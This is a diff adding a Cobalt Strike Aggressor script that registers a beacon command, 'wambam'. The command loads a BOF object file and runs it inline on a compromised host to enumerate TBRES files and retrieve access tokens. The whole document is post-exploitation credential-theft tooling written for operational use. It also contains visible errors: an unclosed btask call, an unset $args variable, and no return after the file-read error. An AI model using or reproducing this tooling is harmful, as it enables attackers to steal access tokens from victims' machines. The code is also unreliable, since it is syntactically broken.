@@ -1,0 +1,27 @@
+alias wambam {
+    local('$barch $handle $data $args');
+    
+    if( size(@_) < 1)
+    {
+        berror($1, beacon_command_detail("wambam"));
+        return;
+    }
+    $barch  = barch($1);
+    $handle = openf(script_resource("wambam. $+ $barch $+ .o"));
+    $data   = readb($handle, -1);
+    closef($handle);
+
+    if(strlen($data) == 0)
+	{
+		berror($1, "could not read bof file");
+	}
+
+    btask($1, "Tasked beacon to enumerate TBRES file";
+    beacon_inline_execute($1, $data, "go", $args);
+}
+
+beacon_command_register(
+    "wambam",
+    "Enumerate TBRES file to retrieve access tokens",
+    "Usage: wambam"
+);
